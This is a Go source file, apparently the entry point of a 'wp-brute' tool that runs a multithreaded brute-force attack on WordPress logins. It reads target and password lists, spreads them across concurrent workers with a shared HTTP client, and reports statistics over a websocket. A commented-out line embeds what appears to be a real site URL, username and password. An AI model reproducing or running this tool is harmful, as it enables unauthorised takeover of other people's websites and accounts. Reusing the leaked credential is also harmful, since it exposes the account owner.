package main

import (
	"fmt"
	"net/http"
	_ "net/http/pprof"
	"os"
	"runtime"
	"strconv"
	"sync"
	"time"

	"github.com/gosuri/uilive"
)

var workers int
var credentials []string
var credentialsChannel chan string

// Entry point - sets up and coordinates the brute force attack
func main() {
	runtime.GOMAXPROCS(runtime.NumCPU())
	//init wait group
	var wg sync.WaitGroup
	wg.Add(1)
	// start websocket client
	go connectAndSendStats(&wg)
	// writer
	writer = uilive.New()
	writer.Start()
	defer writer.Stop()

	if len(os.Args) != 3 {
		fmt.Printf("Usage: wp-brute <credential_file> <Threads>\n")
		return
	}

	crackedfile := os.Args[1]

	var err error
	workers, err = strconv.Atoi(os.Args[2])
	if err != nil {
		fmt.Printf("Error converting string to int: %v", err)
		return
	}

	xPasswords, err = ReadFile(passFile)
	if err != nil {
		fmt.Printf("Error reading password file: %v\n", err)
		os.Exit(1)
	}

	credentials, err = readCredentials(crackedfile)
	if err != nil {
		fmt.Printf("[*] Error reading keys from file: %v", err)
		os.Exit(1)
	}

	total = len(credentials)
	credentialsChannel = make(chan string, total*2)

	fmt.Printf("Total URLs to check: %d\n", total)
	// Start progress display goroutine
	wg.Add(1)
	go func() {
		defer wg.Done()
		for range time.Tick(updateInterval) {
			displayProgress()
		}
	}()

	// Create a shared HTTP client with optimized settings
	httpClient := &http.Client{
		Timeout: 10 * time.Second,
		Transport: &http.Transport{

			IdleConnTimeout:    10 * time.Second,
			DisableCompression: true,
			DisableKeepAlives:  true,
		},
	}

	// Start worker routines with shared client
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go worker(&wg, httpClient)
	}

	// Add credentials to the channel
	for _, cred := range credentials {
		credentialsChannel <- cred
	}
	close(credentialsChannel)

	wg.Wait()

	// err := connectToWordPress("https://spellforgesite.wordpress.com", "mahdiidrissi2022", "Sharky.gamer2020", httpClient)

	// fmt.Print(err)
}

// Processes credentials from channel using shared HTTP client
func worker(wg *sync.WaitGroup, client *http.Client) {
	defer wg.Done()
	for url := range credentialsChannel {
		wpbrute(url, client)
	}
}
